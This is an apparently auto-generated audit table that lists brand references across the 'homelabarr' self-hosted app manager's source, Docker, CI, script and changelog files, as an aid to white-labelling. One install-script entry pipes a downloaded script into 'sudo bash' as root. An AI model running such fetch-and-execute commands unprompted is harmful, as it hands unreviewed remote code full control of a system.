# White-Label Audit (auto-generated)

> **Source:** `scripts/generate-whitelabel-audit.sh`
>
> This file is regenerated automatically on every push to `main`.
> Do not edit by hand — your changes will be overwritten. See the companion
> [White-Label & Forking guide](white-label.md) for the narrative walkthrough.

**Total brand references found:** 1583

---

## User-facing UI (`src/`, `index.html`)

**17 references**

| File | Count | Match |
| ---- | ----- | ----- |
| `index.html` | 1 x | `    <link rel="canonical" href="https://demo.homelabarr.com/">` |
| `index.html` | 1 x | `    <meta property="og:url" content="https://demo.homelabarr.com/">` |
| `src/App.tsx` | 1 x | `              const isEnhancedMount = app.name.includes('homelabarr-mount-enhanced') \|\|` |
| `src/App.tsx` | 1 x | `            <a href="https://discord.gg/Pc7mXX786x" target="_blank" rel="noopener noreferrer" className="hover:text-fore` |
| `src/App.tsx` | 1 x | `            <a href="https://github.com/imogenlabs/homelabarr-ce" target="_blank" rel="noopener noreferrer" className="h` |
| `src/App.tsx` | 1 x | `            <a href="https://wiki.homelabarr.com" target="_blank" rel="noopener noreferrer" className="hover:text-foregr` |
| `src/components/EnhancedMountOnboarding.tsx` | 1 x | `      helpUrl: 'https://docs.homelabarr.com/installation/authelia'` |
| `src/components/EnhancedMountOnboarding.tsx` | 1 x | `      helpUrl: 'https://docs.homelabarr.com/installation/traefik'` |
| `src/components/EnhancedMountOnboarding.tsx` | 1 x | `      helpUrl: 'https://docs.homelabarr.com/setup/domain'` |
| `src/components/HelpModal.tsx` | 1 x | `                  { label: "Discord Community", href: "https://discord.gg/Pc7mXX786x", desc: "Get help & chat" },` |
| `src/components/HelpModal.tsx` | 1 x | `                  { label: "GitHub", href: "https://github.com/imogenlabs/homelabarr-ce", desc: "Source code & issues" }` |
| `src/components/HelpModal.tsx` | 1 x | `                  { label: "Reddit", href: "https://reddit.com/r/homelabarr", desc: "r/homelabarr" },` |
| `src/components/HelpModal.tsx` | 1 x | `                  { label: "Wiki & Docs", href: "https://wiki.homelabarr.com", desc: "Full documentation" },` |
| `src/data/app-metadata.ts` | 1 x | `  'homelabarr-uploader': Zap,` |
| `src/data/app-metadata.ts` | 1 x | `  'homelabarr-web-interface': LayoutDashboard,` |
| `src/main.tsx` | 1 x | `  ['homelabarr_token', 'homelabarr_user', 'homelabarr_jwt'].forEach(k => localStorage.removeItem(k));` |
| `src/utils/iconMap.ts` | 1 x | `const availableIcons = new Set(["alltube", "amd", "aria", "autoscan", "backup", "bazarr", "bazarr4k", "bitwarden", "cali` |

## Backend & server (`server/`, `docker-entrypoint.sh`)

**22 references**

| File | Count | Match |
| ---- | ----- | ----- |
| `server/alert.js` | 1 x | `  const body = JSON.stringify({ ...safe, source: 'homelabarr-ce', ts: new Date().toISOString() });` |
| `server/alert.test.js` | 1 x | `    expect(body).toMatchObject({ event: 'login.locked', actor: 'bob', ip: '1.2.3.4', reason: 'too many', source: 'homela` |
| `server/auth.js` | 1 x | `  email: 'admin@homelabarr.local',` |
| `server/auth.js` | 1 x | `  return Buffer.from(hkdfSync('sha256', current, Buffer.alloc(0), 'homelabarr-api-key-hmac/v1', 32)).toString('hex');` |
| `server/auth.js` | 1 x | `const DUMMY_PASSWORD_HASH = bcrypt.hashSync('homelabarr-timing-equalizer', BCRYPT_COST);` |
| `server/cli-bridge.js` | 1 x | `      ARIA_RPC_SECRET: 'homelabarr',` |
| `server/db.js` | 1 x | `const DB_PATH = process.env.DB_PATH \|\| path.join(process.env.DATA_DIR \|\| path.join(process.cwd(), 'data'), 'homelaba` |
| `server/email.test.js` | 1 x | `      from: 'noreply@homelabarr.com',` |
| `server/log.js` | 1 x | `  defaultMeta: { service: 'homelabarr-backend' },` |
| `server/mfa.test.js` | 2 x | `    const totp = mfa.newTotp('alice@homelabarr');` |
| `server/mfa.test.js` | 1 x | `    expect(totp.label).toBe('alice@homelabarr');` |
| `server/network-manager.js` | 1 x | `                'sqlite://./data/homelabarr.db',` |
| `server/network-manager.js` | 1 x | `      serviceUrls.database = process.env.DATABASE_URL \|\| 'sqlite:///app/data/homelabarr.db';` |
| `server/progress-stream.test.js` | 1 x | `      .mockReturnValue({ corsOrigin: ['https://demo.homelabarr.com'] });` |
| `server/progress-stream.test.js` | 1 x | `    expect(ok.headers['Access-Control-Allow-Origin']).toBe('https://demo.homelabarr.com');` |
| `server/progress-stream.test.js` | 1 x | `    mgr.addClient('ok', ok, fakeReq({ origin: 'https://demo.homelabarr.com' }));` |
| `server/routes/auth-admin.js` | 1 x | `        from: process.env.SMTP_FROM \|\| 'homelabarr@localhost',` |
| `server/routes/dangerous-ops.routes.test.js` | 1 x | `    expect(nameArg).toMatch(/^homelabarr-it-tools-\d+$/);` |
| `server/routes/dangerous-ops.routes.test.js` | 1 x | `    expect(res.body.containerName).toMatch(/^homelabarr-it-tools-\d+$/);` |
| `server/routes/deploy.js` | 1 x | `          const containerName = 'homelabarr-${appId}-${Date.now()}';` |
| `server/start.sh` | 1 x | `# Fix ownership if running as homelabarr but files are root-owned (bind mount)` |

## Docker (`Dockerfile*`, `homelabarr.yml`)

**60 references**

| File | Count | Match |
| ---- | ----- | ----- |
| `Dockerfile.backend` | 1 x | `    /homelabarr \` |
| `Dockerfile.backend` | 1 x | `    /var/log/homelabarr` |
| `Dockerfile.backend` | 1 x | `    /var/log/homelabarr && \` |
| `Dockerfile.backend` | 1 x | `    adduser -u 1001 -G homelabarr -s /bin/bash -D homelabarr` |
| `Dockerfile.backend` | 1 x | `    chown -R homelabarr:homelabarr \` |
| `Dockerfile.backend` | 1 x | `# Create homelabarr user` |
| `Dockerfile.backend` | 1 x | `# Switch to homelabarr user` |
| `Dockerfile.backend` | 1 x | `LABEL io.homelabarr.security.contact="https://github.com/imogenlabs/homelabarr-ce/security/policy"` |
| `Dockerfile.backend` | 1 x | `LABEL org.opencontainers.image.documentation="https://github.com/imogenlabs/homelabarr-ce/blob/main/README.md"` |
| `Dockerfile.backend` | 1 x | `LABEL org.opencontainers.image.source="https://github.com/imogenlabs/homelabarr-ce"` |
| `Dockerfile.backend` | 1 x | `LABEL org.opencontainers.image.title="homelabarr-ce-backend"` |
| `Dockerfile.backend` | 1 x | `LABEL org.opencontainers.image.url="https://demo.homelabarr.com"` |
| `Dockerfile.backend` | 1 x | `RUN addgroup -g 1001 homelabarr && \` |
| `Dockerfile.backend` | 1 x | `RUN mkdir -p /homelabarr` |
| `Dockerfile.backend` | 1 x | `USER homelabarr` |
| `Dockerfile` | 1 x | `    addgroup -g 1001 homelabarr && \` |
| `Dockerfile` | 1 x | `    adduser -u 1001 -G homelabarr -s /bin/sh -D homelabarr && \` |
| `Dockerfile` | 1 x | `    chown -R homelabarr:homelabarr /var/cache/nginx /var/log/nginx /etc/nginx/conf.d && \` |
| `Dockerfile` | 1 x | `    touch /var/run/nginx.pid && chown homelabarr:homelabarr /var/run/nginx.pid` |
| `Dockerfile` | 1 x | `COPY --chown=homelabarr:homelabarr docker-entrypoint.sh /docker-entrypoint.sh` |
| `Dockerfile` | 1 x | `COPY --chown=homelabarr:homelabarr nginx.conf.template /etc/nginx/templates/nginx.conf.template` |
| `Dockerfile` | 1 x | `COPY --chown=homelabarr:homelabarr public/icons /usr/share/nginx/html/icons` |
| `Dockerfile` | 1 x | `COPY --chown=homelabarr:homelabarr public/mascot-2x.webp /usr/share/nginx/html/mascot-2x.webp` |
| `Dockerfile` | 1 x | `COPY --chown=homelabarr:homelabarr public/mascot.webp /usr/share/nginx/html/mascot.webp` |
| `Dockerfile` | 1 x | `LABEL io.homelabarr.security.contact="https://github.com/imogenlabs/homelabarr-ce/security/policy"` |
| `Dockerfile` | 1 x | `LABEL org.opencontainers.image.documentation="https://github.com/imogenlabs/homelabarr-ce/blob/main/README.md"` |
| `Dockerfile` | 1 x | `LABEL org.opencontainers.image.source="https://github.com/imogenlabs/homelabarr-ce"` |
| `Dockerfile` | 1 x | `LABEL org.opencontainers.image.title="homelabarr-ce-frontend"` |
| `Dockerfile` | 1 x | `LABEL org.opencontainers.image.url="https://demo.homelabarr.com"` |
| `Dockerfile` | 1 x | `USER homelabarr` |
| `homelabarr.yml` | 1 x | `      - ${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:ro` |
| `homelabarr.yml` | 1 x | `      - CLI_BRIDGE_PATH=/homelabarr` |
| `homelabarr.yml` | 1 x | `      - apparmor=homelabarr-backend` |
| `homelabarr.yml` | 1 x | `      - apparmor=homelabarr-frontend` |
| `homelabarr.yml` | 2 x | `      - homelabarr` |
| `homelabarr.yml` | 1 x | `      - homelabarr-activity:/app/server/activity-data` |
| `homelabarr.yml` | 1 x | `      - homelabarr-config:/app/server/config` |
| `homelabarr.yml` | 1 x | `      - homelabarr-data:/app/data` |
| `homelabarr.yml` | 2 x | `      - homelabarr-internal` |
| `homelabarr.yml` | 1 x | `    container_name: homelabarr-backend` |
| `homelabarr.yml` | 1 x | `    container_name: homelabarr-frontend` |
| `homelabarr.yml` | 1 x | `    container_name: homelabarr-socket-proxy` |
| `homelabarr.yml` | 1 x | `    image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `homelabarr.yml` | 1 x | `    image: ghcr.io/imogenlabs/homelabarr-frontend:latest` |
| `homelabarr.yml` | 1 x | `    name: homelabarr` |
| `homelabarr.yml` | 1 x | `    name: homelabarr-activity` |
| `homelabarr.yml` | 1 x | `    name: homelabarr-config` |
| `homelabarr.yml` | 1 x | `    name: homelabarr-data` |
| `homelabarr.yml` | 1 x | `    name: homelabarr-internal` |
| `homelabarr.yml` | 1 x | `    user: "1001:1001"  # the image's own homelabarr user; it owns /etc/nginx and the entrypoint` |
| `homelabarr.yml` | 1 x | `  homelabarr-activity:` |
| `homelabarr.yml` | 1 x | `  homelabarr-config:` |
| `homelabarr.yml` | 1 x | `  homelabarr-data:` |
| `homelabarr.yml` | 1 x | `  homelabarr-internal:` |
| `homelabarr.yml` | 1 x | `  homelabarr:` |
| `homelabarr.yml` | 1 x | `#   CLI_BRIDGE_HOST_PATH  — path to your HomelabARR CLI installation (default: /opt/homelabarr)` |
| `homelabarr.yml` | 1 x | `#   CORS_ORIGIN     — your public domain (e.g., https://homelabarr.example.com)` |
| `homelabarr.yml` | 1 x | `#   docker compose -f homelabarr.yml up -d` |

## CI/CD workflows (`.github/workflows/`)

**48 references**

| File | Count | Match |
| ---- | ----- | ----- |
| `.github/workflows/changelog.yml` | 1 x | `# https://wiki.homelabarr.com/install/changelog/` |
| `.github/workflows/compliance-binder.yml` | 1 x | `          EVIDENCE_HOST: 'dev.homelabarr.com'` |
| `.github/workflows/compliance-evidence.yml` | 1 x | `          EVIDENCE_HOST: dev.homelabarr.com` |
| `.github/workflows/dast-active.yml` | 1 x | `  ZAP_TARGET: ${{ inputs.target \|\| 'https://dev.homelabarr.com' }}` |
| `.github/workflows/dast-baseline.yml` | 1 x | `          target: 'https://dev.homelabarr.com'` |
| `.github/workflows/dependency-staleness.yml` | 1 x | `                  body: '**Staleness alert:** This ${b.cls} dependency PR has been open ${b.ageDays} days. ${b.status} p` |
| `.github/workflows/deploy-drift.yml` | 1 x | `                  body: 'Deploy drift detected for release ${releaseTag}.\n\n${summary}\n\nDeploy the pinned release dig` |
| `.github/workflows/deploy-drift.yml` | 1 x | `            const LIVE_URL = 'https://demo.homelabarr.com/';` |
| `.github/workflows/docker-build-push.yml` | 2 x | `          --certificate-identity-regexp 'https://github.com/imogenlabs/homelabarr-ce/.github/workflows/' \` |
| `.github/workflows/docker-build-push.yml` | 1 x | `          echo "curl -o homelabarr.yml https://raw.githubusercontent.com/${{ github.repository }}/main/homelabarr.yml"` |
| `.github/workflows/docker-build-push.yml` | 1 x | `          echo "docker-compose -f homelabarr.yml up -d"` |
| `.github/workflows/docker-build-push.yml` | 1 x | `          echo "export CLI_BRIDGE_HOST_PATH=/path/to/your/homelabarr-cli"` |
| `.github/workflows/docker-build-push.yml` | 1 x | `        # Update homelabarr.yml with latest image tags` |
| `.github/workflows/docker-build-push.yml` | 1 x | `        payload="{\"embeds\":[{\"title\":\"HomelabARR CE $TAG Released\",\"author\":{\"name\":\"Imogen Labs\"},\"color\"` |
| `.github/workflows/docker-build-push.yml` | 1 x | `        sed -i 's\|ghcr.io/.*/homelabarr-backend:.*\|${{ env.REGISTRY }}/${{ env.NAMESPACE }}/${{ env.BACKEND_IMAGE_NAME` |
| `.github/workflows/docker-build-push.yml` | 1 x | `        sed -i 's\|ghcr.io/.*/homelabarr-frontend:.*\|${{ env.REGISTRY }}/${{ env.NAMESPACE }}/${{ env.FRONTEND_IMAGE_NA` |
| `.github/workflows/docker-build-push.yml` | 1 x | `  # Docker Hub namespace stays smashingtags: that's where the existing repos,` |
| `.github/workflows/docker-build-push.yml` | 1 x | `  # to BOTH GHCR (imogenlabs) and Docker Hub (smashingtags) — Docker Hub is the` |
| `.github/workflows/docker-build-push.yml` | 1 x | `  BACKEND_IMAGE_NAME: homelabarr-backend` |
| `.github/workflows/docker-build-push.yml` | 1 x | `  DOCKERHUB_NAMESPACE: smashingtags` |
| `.github/workflows/docker-build-push.yml` | 1 x | `  FRONTEND_IMAGE_NAME: homelabarr-frontend` |
| `.github/workflows/e2e-tests.yml` | 1 x | `          TEST_BASE_URL: https://ce-dev.homelabarr.com` |
| `.github/workflows/pages.yml` | 1 x | `    # MUST be hosted: homelabarr-ce is a PUBLIC repo, and GitHub blocks public` |
| `.github/workflows/pentest.yml` | 1 x | `          ART_TARGET: ${{ github.event.inputs.target \|\| 'https://dev.homelabarr.com' }}` |
| `.github/workflows/pentest.yml` | 1 x | `        default: 'https://dev.homelabarr.com'` |
| `.github/workflows/quickstart.yml` | 1 x | `            backend=$(docker inspect -f '{{.State.Health.Status}}' homelabarr-backend 2>/dev/null \|\| true)` |
| `.github/workflows/quickstart.yml` | 1 x | `            frontend=$(docker inspect -f '{{.State.Health.Status}}' homelabarr-frontend 2>/dev/null \|\| true)` |
| `.github/workflows/quickstart.yml` | 1 x | `          commands = re.sub(r'^cd /opt/homelabarr\s*\n', '', commands, flags=re.M)` |
| `.github/workflows/quickstart.yml` | 1 x | `          commands = re.sub(r'^git clone .* /opt/homelabarr\s*\n', '', block.group(1), flags=re.M)` |
| `.github/workflows/quickstart.yml` | 1 x | `          docker build -f Dockerfile -t ghcr.io/imogenlabs/homelabarr-frontend:latest .` |
| `.github/workflows/quickstart.yml` | 1 x | `          docker build -f Dockerfile.backend -t ghcr.io/imogenlabs/homelabarr-backend:latest .` |
| `.github/workflows/quickstart.yml` | 1 x | `          for c in homelabarr-backend homelabarr-frontend homelabarr-socket-proxy; do` |
| `.github/workflows/quickstart.yml` | 1 x | `          sudo dmesg \| grep -E 'apparmor="DENIED"' \| grep -E 'profile="homelabarr-' \| sed -E 's/.*(operation="[^"]*")` |
| `.github/workflows/security-audit.yml` | 1 x | `          category: 'trivy-homelabarr-backend'` |
| `.github/workflows/security-audit.yml` | 1 x | `          category: 'trivy-homelabarr-frontend'` |
| `.github/workflows/security-audit.yml` | 1 x | `          ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `.github/workflows/security-audit.yml` | 1 x | `          ghcr.io/imogenlabs/homelabarr-frontend:latest` |
| `.github/workflows/security-audit.yml` | 1 x | `          sarif_file: 'trivy-results/trivy-ghcr.io_imogenlabs_homelabarr-backend_latest.sarif'` |
| `.github/workflows/security-audit.yml` | 1 x | `          sarif_file: 'trivy-results/trivy-ghcr.io_imogenlabs_homelabarr-frontend_latest.sarif'` |
| `.github/workflows/security-audit.yml` | 1 x | `        if: always() && hashFiles('trivy-results/trivy-ghcr.io_imogenlabs_homelabarr-backend_latest.sarif') != ''` |
| `.github/workflows/security-audit.yml` | 1 x | `        if: always() && hashFiles('trivy-results/trivy-ghcr.io_imogenlabs_homelabarr-frontend_latest.sarif') != ''` |
| `.github/workflows/uptime.yml` | 1 x | `            "https://demo.homelabarr.com/api/health\|\"ok\":true"` |
| `.github/workflows/uptime.yml` | 1 x | `            "https://demo.homelabarr.com/\|"` |
| `.github/workflows/uptime.yml` | 1 x | `            "https://dev.homelabarr.com/api/health\|\"ok\":true"` |
| `.github/workflows/uptime.yml` | 1 x | `            "https://dev.homelabarr.com/\|"` |
| `.github/workflows/uptime.yml` | 1 x | `          # Try each configured webhook until one is accepted. DISCORD_WEBHOOK_HOMELABARR` |
| `.github/workflows/uptime.yml` | 1 x | `          WEBHOOK_1: ${{ secrets.DISCORD_WEBHOOK_HOMELABARR }}` |

## Config files (`package.json`, `CNAME`, `.env.example`, `nginx.conf.template`)

**4 references**

| File | Count | Match |
| ---- | ----- | ----- |
| `.env.example` | 1 x | `# If you cloned to /opt/homelabarr (recommended), leave this as-is.` |
| `.env.example` | 1 x | `CLI_BRIDGE_HOST_PATH=/opt/homelabarr` |
| `CNAME` | 1 x | `wiki.homelabarr.com` |
| `package.json` | 1 x | `  "name": "homelabarr",` |

## Install & utility scripts

**80 references**

| File | Count | Match |
| ---- | ----- | ----- |
| `install-remote.sh` | 1 x | `# Usage: sudo wget -qO- https://raw.githubusercontent.com/imogenlabs/homelabarr-ce/main/install-remote.sh \| sudo bash` |
| `install-remote.sh` | 1 x | `BIN_NAME="homelabarr-cli"` |
| `install-remote.sh` | 1 x | `INSTALL_DIR="/opt/homelabarr"` |
| `install-remote.sh` | 1 x | `REPO="https://github.com/imogenlabs/homelabarr-ce.git"` |
| `install-remote.sh` | 1 x | `echo "    Discord: https://discord.gg/Pc7mXX786x"` |
| `install-remote.sh` | 1 x | `echo "    Run the installer:  sudo homelabarr-cli -i"` |
| `install-remote.sh` | 1 x | `echo "    Wiki: https://wiki.homelabarr.com/"` |
| `preinstall/README.md` | 1 x | `Image: ghcr.io/imogenlabs/homelabarr-cli/docker-local-persist:latest` |
| `preinstall/README.md` | 1 x | `cd /path/to/homelabarr-cli` |
| `preinstall/installer/subinstall/lxc.sh` | 1 x | `    $(command -v ansible-playbook) /opt/homelabarr/preinstall/installer/subinstall/lxc.yml 1>/dev/null 2>&1` |
| `preinstall/installer/subinstall/lxc.sh` | 1 x | `  if [[ ! -f "/home/.lxcstart.sh" ]]; then $(command -v rsync) -aqhv /opt/homelabarr/preinstall/installer/subinstall/lxc` |
| `preinstall/installer/subinstall/lxc.sh` | 1 x | `  if [[ -f "/home/.lxcstart.sh" ]]; then $(command -v ansible-playbook) /opt/homelabarr/preinstall/installer/subinstall/` |
| `preinstall/installer/ubuntu.sh` | 1 x | `chown -R 1000:1000 /opt/homelabarr` |
| `preinstall/installer/ubuntu.sh` | 1 x | `mkdir -p /opt/homelabarr` |
| `preinstall/templates/local/gpu.sh` | 1 x | `# Author(s):  homelabarr-cli                  #` |
| `preinstall/templates/local/gpu.sh` | 1 x | `# Docker Maintainer homelabarr-cli            #` |
| `preinstall/templates/local/gpu.sh` | 1 x | `# Docker owned homelabarr-cli                 #` |
| `scripts/backup-cron.sh` | 1 x | `  rsync -av "$BACKUP_LOCAL/homelabarr.$STAMP.db" "$BACKUP_REMOTE/" 2>/dev/null \|\| true` |
| `scripts/backup.sh` | 1 x | `      "${LOCAL_DIR}/homelabarr.${TS}.db.gpg.sha256" 2>/dev/null \|\| true` |
| `scripts/backup.sh` | 1 x | `      --output "${LOCAL_DIR}/homelabarr.${TS}.db.gpg" "${LOCAL_DIR}/homelabarr.${TS}.db"` |
| `scripts/backup.sh` | 1 x | `  BACKUP_FILE="${LOCAL_DIR}/homelabarr.${TS}.db"` |
| `scripts/backup.sh` | 1 x | `  BACKUP_FILE="${LOCAL_DIR}/homelabarr.${TS}.db.gpg"` |
| `scripts/backup.sh` | 1 x | `  rm -f "${LOCAL_DIR}/homelabarr.${TS}.db"` |
| `scripts/backup.sh` | 1 x | `  sha256sum "${LOCAL_DIR}/homelabarr.${TS}.db.gpg" > "${LOCAL_DIR}/homelabarr.${TS}.db.gpg.sha256"` |
| `scripts/backup.sh` | 1 x | `OUT="${LOCAL_DIR}/homelabarr-${TS}.tar"` |
| `scripts/backup.sh` | 1 x | `docker cp "homelabarr-backend:/app/data/homelabarr.db" "${LOCAL_DIR}/homelabarr.${TS}.db"` |
| `scripts/backup.sh` | 1 x | `find "$LOCAL_DIR" -name 'homelabarr-*' -mtime +14 -delete 2>/dev/null \|\| true` |
| `scripts/bump-image-digests.sh` | 1 x | `    homelabarr.yml` |
| `scripts/bump-image-digests.sh` | 1 x | `echo "Verify with: cosign verify --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' --certifi` |
| `scripts/bump-image-digests.sh` | 1 x | `for img in homelabarr-frontend homelabarr-backend; do` |
| `scripts/bump-image-digests.sh` | 1 x | `rm -f homelabarr.yml.bak` |
| `scripts/demo-reset/homelabarr-demo-reset.service` | 1 x | `ExecStart=/usr/local/bin/homelabarr-demo-reset` |
| `scripts/demo-reset/homelabarr-demo-reset.timer` | 1 x | `Unit=homelabarr-demo-reset.service` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `    compose_homelabarr-demo-*) ;;` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `  compose_homelabarr-demo-activity` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `  compose_homelabarr-demo-config` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `  compose_homelabarr-demo-data` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `# Restores demo.homelabarr.com to its pristine state.` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `# in the same directory, which runs homelabarr.com, mjashley.com, eightly,` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `BACKEND=homelabarr-demo-backend` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `COMPOSE_FILE=${COMPOSE_FILE:-/opt/appdata/compose/docker-compose.homelabarr-demo.yml}` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `DEMO_SERVICES=(homelabarr-demo-backend homelabarr-demo-frontend)` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `ENV_FILE=${HOMELABARR_DEMO_RESET_ENV:-/etc/homelabarr/demo-reset.env}` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `FRONTEND=homelabarr-demo-frontend` |
| `scripts/demo-reset/homelabarr-demo-reset` | 1 x | `HEALTH_URL=${HEALTH_URL:-https://demo.homelabarr.com/api/applications}` |
| `scripts/detect-lxc-storage.sh` | 1 x | `        echo "   • Edit: /opt/homelabarr/config/storage-override.json"` |
| `scripts/detect-lxc-storage.sh` | 1 x | `    local CONFIG_DIR="/opt/homelabarr/config"` |
| `scripts/encrypt-db.sh` | 1 x | `DB_PATH="${1:?usage: $0 <path/to/homelabarr.db>}"` |
| `scripts/fix-storage-detection.sh` | 1 x | `CONFIG_DIR="/opt/homelabarr/config"` |
| `scripts/fix-storage-detection.sh` | 1 x | `echo "  3. Check logs: docker logs homelabarr-api"` |
| `scripts/host-alert/homelabarr-host-alert.service` | 1 x | `ExecStart=/usr/local/bin/homelabarr-host-alert` |
| `scripts/host-alert/homelabarr-host-alert.timer` | 1 x | `Unit=homelabarr-host-alert.service` |
| `scripts/host-alert/homelabarr-host-alert` | 1 x | `  echo "Set SMTP_URL (and ALERT_EMAIL_TO) or WEBHOOK_URL, then: systemctl start homelabarr-host-alert.service" >&2` |
| `scripts/host-alert/homelabarr-host-alert` | 1 x | `ENV_FILE=${HOMELABARR_ALERT_ENV:-/etc/homelabarr/host-alert.env}` |
| `scripts/host-alert/homelabarr-host-alert` | 1 x | `RUNBOOK=${RUNBOOK:-https://github.com/imogenlabs/homelabarr-ce/blob/main/docs/hypervisor-alerting.md}` |
| `scripts/host-alert/homelabarr-host-alert` | 1 x | `STATE_FILE=${HOMELABARR_ALERT_STATE:-/var/lib/homelabarr/host-alert.state}` |
| `scripts/install-apparmor.sh` | 1 x | `aa-status \| grep homelabarr-backend \|\| echo "Profile loaded"` |
| `scripts/install-apparmor.sh` | 1 x | `apparmor_parser -r /etc/apparmor.d/homelabarr-backend` |
| `scripts/install-apparmor.sh` | 1 x | `apparmor_parser -r /etc/apparmor.d/homelabarr-frontend` |
| `scripts/install-apparmor.sh` | 1 x | `cat >/etc/apparmor.d/homelabarr-backend <<'EOF'` |
| `scripts/install-apparmor.sh` | 1 x | `cat >/etc/apparmor.d/homelabarr-frontend <<'EOF'` |
| `scripts/install-apparmor.sh` | 1 x | `echo "AppArmor profiles installed: homelabarr-backend, homelabarr-frontend"` |
| `scripts/install-apparmor.sh` | 1 x | `echo 'AppArmor: homelabarr profiles configured'` |
| `scripts/install-apparmor.sh` | 1 x | `if ! aa-status 2>/dev/null \| grep -E 'homelabarr-(backend\|frontend)' \| grep -q 'enforce'; then` |
| `scripts/install-apparmor.sh` | 1 x | `profile homelabarr-backend flags=(attach_disconnected,mediate_deleted) {` |
| `scripts/install-apparmor.sh` | 1 x | `profile homelabarr-frontend flags=(attach_disconnected,mediate_deleted) {` |
| `scripts/intelligent-storage-detection.sh` | 1 x | `    local CONFIG_DIR="/opt/homelabarr/config"` |
| `scripts/restore-drill.sh` | 1 x | `LATEST_DB="$(ls -1t "$BACKUP_DIR"/homelabarr.*.db 2>/dev/null \| head -1)"` |
| `scripts/test/test-ecosystem.sh` | 1 x | `            echo "  • Web Interface: https://homelabarr.$domain"` |
| `scripts/test/test-ecosystem.sh` | 1 x | `        "/opt/appdata/homelabarr"` |
| `scripts/test/test-ecosystem.sh` | 1 x | `        "apps/system/homelabarr-uploader.yml"` |
| `scripts/test/test-ecosystem.sh` | 1 x | `        "apps/system/homelabarr-web-interface.yml"` |
| `scripts/test/test-ecosystem.sh` | 1 x | `        "homelabarr_backend_data:/opt/appdata/homelabarr/backend/data"` |
| `scripts/test/test-ecosystem.sh` | 1 x | `        test_service_connectivity "homelabarr_backend" "homelabarr-uploader" "9999"` |
| `scripts/test/test-ecosystem.sh` | 1 x | `        test_service_connectivity "homelabarr_backend" "mount-enhanced" "8080"` |
| `scripts/test/test-ecosystem.sh` | 1 x | `    # Test homelabarr network` |
| `scripts/test/test-ecosystem.sh` | 1 x | `    if docker network inspect homelabarr > /dev/null 2>&1; then` |
| `scripts/test/test-ecosystem.sh` | 1 x | `    if docker ps --filter "name=homelabarr_backend" --format "{{.Names}}" \| grep -q "homelabarr_backend"; then` |
| `scripts/test/test-ecosystem.sh` | 1 x | `    if docker ps --filter "name=homelabarr_backend" --format "{{.Ports}}" \| grep -q "8092"; then` |
| `scripts/validate-templates.sh` | 1 x | `RESULTS_DIR="/tmp/homelabarr-validate"` |

## Root documentation

**104 references**

| File | Count | Match |
| ---- | ----- | ----- |
| `CHANGELOG.md` | 1 x | `- **Adversarial-review remediation: validation, CORS, auth, and Docker-manager hardening** (Epic [HLCE-279](https://mjas` |
| `CHANGELOG.md` | 1 x | `- **Audit chain tip gets an out-of-band signed anchor** (Epic [HLCE-286](https://mjashley.atlassian.net/browse/HLCE-286)` |
| `CHANGELOG.md` | 1 x | `- **Audit hash chain now detects boundary-ambiguous tampering** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/H` |
| `CHANGELOG.md` | 1 x | `- **Audit hash-chain + secure-logging tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-217` |
| `CHANGELOG.md` | 1 x | `- **Auth HTTP route integration tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-216, [#30` |
| `CHANGELOG.md` | 1 x | `- **Auth core tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-212, [#296](https://github.` |
| `CHANGELOG.md` | 1 x | `- **Automated test foundation + Wave 1** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), [#294](https:` |
| `CHANGELOG.md` | 1 x | `- **Bug-lock regression suite — 3 latent bugs fixed** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209)` |
| `CHANGELOG.md` | 1 x | `- **Container delete/stop/restart**: Docker client was never passed to the CLI manager. All container operations now wor` |
| `CHANGELOG.md` | 1 x | `- **Dangerous-operation integration tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-229, ` |
| `CHANGELOG.md` | 1 x | `- **Deploy progress stream**: SSE 'connected' event now includes the server-assigned 'clientId', fixing "Client not foun` |
| `CHANGELOG.md` | 1 x | `- **Deploy-execution + remaining backend-branch coverage; dead-code removal** (Epic [HLCE-270](https://mjashley.atlassia` |
| `CHANGELOG.md` | 1 x | `- **Deploy/SSE + startup-guard + network tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-` |
| `CHANGELOG.md` | 1 x | `- **Docker connection-manager tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-219, [#304]` |
| `CHANGELOG.md` | 1 x | `- **Docker health now reflects a real probe instead of always reporting healthy** (Epic [HLCE-209](https://mjashley.atla` |
| `CHANGELOG.md` | 1 x | `- **Docker socket permissions**: Apps that mount 'docker.sock' (Portainer, etc.) now get 'group_add' injected at deploy ` |
| `CHANGELOG.md` | 1 x | `- **E2E round 2 — failure / permission / account journeys + hardened assertions** (Epic [HLCE-270](https://mjashley.at` |
| `CHANGELOG.md` | 1 x | `- **Fix deploy endpoint 404 — deploy-from-UI was unreachable in production** (Epic [HLCE-209](https://mjashley.atlassi` |
| `CHANGELOG.md` | 1 x | `- **Fix: 'GET /containers?stats=true' no longer blocks the event loop** (HLCE-275, [#331](https://github.com/imogenlabs/` |
| `CHANGELOG.md` | 1 x | `- **Frontend security-component tests + lib/api gap-fills + a password-policy fix** (Epic [HLCE-270](https://mjashley.at` |
| `CHANGELOG.md` | 1 x | `- **High-value component tests (RTL)** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-225, [#307` |
